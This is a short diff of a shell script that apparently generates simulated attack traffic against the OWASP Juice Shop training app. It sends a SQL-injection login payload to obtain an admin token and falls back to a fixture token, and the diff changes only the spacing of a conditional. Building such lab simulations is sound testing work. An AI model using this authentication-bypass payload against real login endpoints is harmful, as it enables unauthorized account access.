@@ -63,7 +63,7 @@ echo "  [T1565.a] Injecting fake product review via Juice Shop API:"
 token=$(curl -sf -X POST "${BASE}/juice-shop/rest/user/login" \
   -H "Content-Type: application/json" \
   -d '{"email":"admin'\''--","password":"x"}' --max-time 10 2>/dev/null | jq -r '.authentication.token' 2>/dev/null)
-if [[ ( -z "$token" || "$token" == "null" ) && -n "${TGEN_FIXTURES:-}" ]]; then
+if [[ (-z "$token" || "$token" == "null") && -n "${TGEN_FIXTURES:-}" ]]; then
   token=$(python3 "$(dirname "$0")/../../scripts/fixture_token.py")
   echo "[FIXTURE] Using the real seeded token after the preserved login was mitigated"
 fi
